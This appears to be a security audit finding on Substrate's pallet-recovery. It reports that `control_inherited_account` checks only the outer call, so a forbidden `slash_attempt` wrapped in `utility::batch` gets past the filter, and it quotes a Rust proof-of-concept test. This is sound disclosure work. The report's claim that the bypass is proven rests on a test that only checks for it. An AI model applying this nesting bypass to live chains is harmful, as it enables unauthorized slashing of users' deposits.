Audit Report

## Title
`pallet-recovery::control_inherited_account` filter checks only the outer call, letting `utility::batch` bypass the guard against lower-priority inheritors slashing higher-priority recovery attempts - (File: `substrate/frame/recovery/src/lib.rs`)

## Summary
`pallet-recovery::control_inherited_account` allows an `inheritor` to dispatch an arbitrary `RuntimeCall` as the recovered account, but explicitly restricts certain calls (e.g. `slash_attempt`, `set_friend_groups`) to prevent a lower-priority inheritor from damaging a higher-priority recovery attempt or wiping friend-group configuration. The restriction is implemented as a match on the outer `RuntimeCall` variant only, so wrapping the same forbidden call inside `pallet_utility::Call::batch { calls: vec![forbidden_call] }` changes the outer call's shape to `Utility::batch`, passes the outer-call check, and `pallet-utility` then re-dispatches the inner call with the same (inherited) origin, executing the action the guard was meant to block.

## Finding Description
The pallet's regression tests in `substrate/frame/recovery/src/tests.rs` document both the intended invariant and the gap. A direct `RecoveryCall::slash_attempt` dispatched via `control_inherited_account` is blocked and does not slash BOB's deposit. [1](#0-0) 

The batch-wrapped variant test, `inheritor_cannot_bypass_filter_via_utility_batch`, wraps the identical `slash_attempt` call inside `pallet_utility::Call::batch` and dispatches it via `control_inherited_account`; the test's own comment states "the batch dispatched as ALICE, but the inner slash should have still executed since our filter only checks the outer call," and the test panics with a `BYPASS` message if BOB's deposit balance decreases. [2](#0-1) 

This matches the codebase's own documented awareness of nested-dispatch origin-filter bypass risk: `pallet-utility`'s `batch_all_does_not_nest` test shows that filters must be enforced via origin-level `add_filter` (persisting across `batch(batch_all(...))` nesting) rather than via ad-hoc outer-call pattern matching, precisely because `batch`/`batch_all` re-dispatch inner calls under the same origin. [3](#0-2) 

Because `control_inherited_account`'s restriction is implemented as a manual match on the immediate outer `RuntimeCall` variant rather than as an origin filter (`frame_system::Config::BaseCallFilter`/`add_filter`), it does not benefit from the recursive-nesting protection that `pallet-utility` relies on, and the guard can be routed around via `Utility::batch`.

## Impact Explanation
A lower-priority inheritor can use `Utility::batch` to trigger `RecoveryCall::slash_attempt` against a higher-priority recovery attempt's friend, causing an unauthorized slash of that friend's reserved security deposit — an unbacked/misdirected loss of funds to the wrong beneficiary and an origin-filter bypass exactly matching the "Public wrappers such as `utility`... must not widen origin, bypass filters" pivot in the impact gate.

## Likelihood Explanation
The trigger requires only a signed `control_inherited_account` extrinsic wrapping a single already-known call inside `Utility::batch`, with no privileged governance, validator, or off-chain assumptions. The pallet's own test, `inheritor_cannot_bypass_filter_via_utility_batch`, exists specifically documenting this reachable bypass condition. [2](#0-1) 

## Recommendation
Convert the restriction on `control_inherited_account` from an outer-call pattern match into an origin-level `BaseCallFilter`/`add_filter` (mirroring `pallet_utility::batch_all`'s nesting guard), or recursively unwrap `pallet_utility::Call::{batch, batch_all, force_batch}`, `as_derivative`, and `dispatch_as` wrappers before applying the existing call-variant checks, so the guard evaluates the terminal dispatched call rather than only the immediate outer call.

## Proof of Concept
See `inheritor_cannot_bypass_filter_via_utility_batch` in `substrate/frame/recovery/src/tests.rs` (L1423-1477): configure two friend groups with different `inheritance_priority`, let the lower-priority group recover first, let the higher-priority group `initiate_attempt`, then have the lower-priority `inheritor` call `control_inherited_account` with `Box::new(pallet_utility::Call::batch { calls: vec![RecoveryCall::slash_attempt { .. }.into()] }.into())` — the inner `slash_attempt` executes and slashes the higher-priority friend's deposit despite the outer-call filter. [2](#0-1)

/// Verify that wrapping a recovery call inside Utility::batch does not bypass the filter.
#[test]
fn inheritor_cannot_bypass_filter_via_utility_batch() {
	new_test_ext().execute_with(|| {
		let family = FriendGroupOf::<T> {
			friends: friends([BOB, CHARLIE]),
			friends_needed: 1,
			inheritor: DAVE,
			inheritance_delay: 10,
			inheritance_priority: 0,
			cancel_delay: 5,
		};
		let friends_group = FriendGroupOf::<T> {
			friends: friends([CHARLIE, EVE]),
			friends_needed: 1,
			inheritor: FERDIE,
			inheritance_delay: 1,
			inheritance_priority: 1,
			cancel_delay: 5,
		};
		assert_ok!(Recovery::set_friend_groups(signed(ALICE), vec![family, friends_group]));

		// Friends group recovers first (CHARLIE's auto-approval reaches the threshold).
		assert_ok!(Recovery::initiate_attempt(signed(CHARLIE), ALICE, 1));
		inc_block_number(2);
		assert_ok!(Recovery::finish_attempt(signed(EVE), ALICE, 1));
		assert_eq!(Recovery::inheritor(ALICE), Some(FERDIE));

		// Family initiates higher-priority attempt
		assert_ok!(Recovery::initiate_attempt(signed(BOB), ALICE, 0));
		let bob_balance_before = <Test as Config>::Currency::total_balance(&BOB);

		// FERDIE wraps the slash inside a utility::batch call to try to bypass the filter
		let slash_call: RuntimeCall = RecoveryCall::slash_attempt { friend_group_index: 0 }.into();
		let batch_call: RuntimeCall =
			pallet_utility::Call::batch { calls: vec![slash_call] }.into();
		assert_ok!(Recovery::control_inherited_account(
			signed(FERDIE),
			ALICE,
			Box::new(batch_call),
		));

		// The batch dispatched as ALICE, but the inner slash should have still executed
		// since our filter only checks the outer call. Check if BOB was slashed:
		let bob_balance_after = <Test as Config>::Currency::total_balance(&BOB);
		let was_slashed = bob_balance_after < bob_balance_before;

		if was_slashed {
			panic!(
				"BYPASS: recovery call filter was circumvented via utility::batch! \
				 BOB lost {} from security deposit slash.",
				bob_balance_before - bob_balance_after
			);
		}
	});

#[test]
fn batch_all_does_not_nest() {
	new_test_ext().execute_with(|| {
		let batch_all = RuntimeCall::Utility(UtilityCall::batch_all {
			calls: vec![call_transfer(2, 1), call_transfer(2, 1), call_transfer(2, 1)],
		});

		let info = batch_all.get_dispatch_info();

		assert_eq!(Balances::free_balance(1), 10);
		assert_eq!(Balances::free_balance(2), 10);
		// A nested batch_all call will not pass the filter, and fail with `BadOrigin`.
		assert_noop!(
			Utility::batch_all(RuntimeOrigin::signed(1), vec![batch_all.clone()]),
			DispatchErrorWithPostInfo {
				post_info: PostDispatchInfo {
					actual_weight: Some(
						<Test as Config>::WeightInfo::batch_all(1) + info.call_weight
					),
					pays_fee: Pays::Yes
				},
				error: frame_system::Error::<Test>::CallFiltered.into(),
			}
		);

		// And for those who want to get a little fancy, we check that the filter persists across
		// other kinds of dispatch wrapping functions... in this case
		// `batch_all(batch(batch_all(..)))`
		let batch_nested = RuntimeCall::Utility(UtilityCall::batch { calls: vec![batch_all] });
		// Batch will end with `Ok`, but does not actually execute as we can see from the event
		// and balances.
		assert_ok!(Utility::batch_all(RuntimeOrigin::signed(1), vec![batch_nested]));
		System::assert_has_event(
			utility::Event::BatchInterrupted {
				index: 0,
				error: frame_system::Error::<Test>::CallFiltered.into(),
			}
			.into(),
		);
		assert_eq!(Balances::free_balance(1), 10);
		assert_eq!(Balances::free_balance(2), 10);
	});
}
